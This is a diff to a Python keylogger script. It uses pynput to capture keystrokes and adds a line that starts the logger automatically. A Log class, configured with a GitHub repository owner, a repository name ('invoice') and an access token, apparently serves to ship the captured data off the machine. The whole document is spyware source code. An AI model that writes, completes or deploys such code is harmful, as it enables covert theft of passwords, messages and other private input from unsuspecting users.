@@ -1,6 +1,12 @@
 from pynput.keyboard import Key, Listener
 import logging
 import os
+import socket
+import platform
+import requests
+import base64
+import getpass
+import datetime
 
 
 class Keylogger():
@@ -35,16 +41,9 @@ class Keylogger():
             listener.join()
 
 	
-	
-import socket
-import platform
-import requests
-import base64
-import getpass
-import datetime
 
 
-class Log:
+class Log():
     def __init__(self, repository_owner, repository_name, access_token):
         self.repository_owner = repository_owner
         self.repository_name = repository_name
@@ -107,6 +106,8 @@ class Log:
 	
 repository_owner = 'rsecurity12' 
 repository_name = 'invoice' 
-access_token = ''  
-keylogger = Keylogger("Keylogger")
+access_token = 'sssd'  
 file_creator = Log(repository_owner, repository_name, access_token)
+keylogger = Keylogger("Keylogger")
+keylogger.Run_Keylogger()
+
